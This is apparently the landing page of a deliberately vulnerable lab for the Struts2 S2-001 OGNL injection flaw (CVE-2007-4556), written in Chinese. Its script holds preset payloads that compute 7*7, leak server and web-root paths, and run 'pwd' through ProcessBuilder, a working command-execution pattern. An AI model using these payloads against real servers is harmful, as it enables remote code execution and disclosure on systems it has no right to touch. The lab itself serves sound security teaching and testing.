<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-001 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin-top: 14px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; }
        a { color: #155b52; }
        code, pre { font-family: Consolas, monospace; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-001 演示靶场</h1>
        <p>这个模块使用旧版 Struts2 表单标签和校验失败回填场景，用来演示 <code>S2-001 / CVE-2007-4556</code>。为了安全起见，首页只建议使用无害表达式验证是否发生了 OGNL 二次解析。</p>
    </div>
    <div class="card">
        <h2>推荐入口</h2>
        <p><a href="login.action">打开登录页 /login.action</a></p>
        <pre>POST /login.action
username=%{7*7}
password=</pre>
        <p>如果触发表单校验失败且发生表达式解析，重新渲染后的用户名区域会出现计算结果，而不是原始字符串。</p>
    </div>
    <div class="card">
        <h2>快捷测试</h2>
        <p>点击下面的测试按钮会自动把 payload 放到 <code>username</code>，并以空密码提交到 <code>/login.action</code>。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPayload('basic')">测试 7*7</button>
            <button type="button" class="preset-btn" onclick="fillPayload('tomcatDir')">获取 Tomcat 路径</button>
            <button type="button" class="preset-btn" onclick="fillPayload('webPath')">获取 Web 路径</button>
            <button type="button" class="preset-btn" onclick="fillPayload('execPwd')">执行 pwd</button>
            <button type="button" class="submit-btn" onclick="submitPayload()">提交当前 Payload</button>
        </div>
        <div class="field">
            <label for="payloadBox">当前 Username Payload</label>
            <textarea id="payloadBox">%{7*7}</textarea>
        </div>
        <form id="quickTestForm" action="login.action" method="post">
            <input type="hidden" id="quickUsername" name="username"/>
            <input type="hidden" name="password" value=""/>
        </form>
    </div>
</div>
<script>
    const payloads = {
        basic: '%{7*7}',
        tomcatDir: '%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}',
        webPath: '%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath(\'/\')),#response.flush(),#response.close()}',
        execPwd: '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
    };

    function fillPayload(key) {
        document.getElementById('payloadBox').value = payloads[key];
    }

    function submitPayload() {
        document.getElementById('quickUsername').value = document.getElementById('payloadBox').value;
        document.getElementById('quickTestForm').submit();
    }
</script>
</body>
</html>
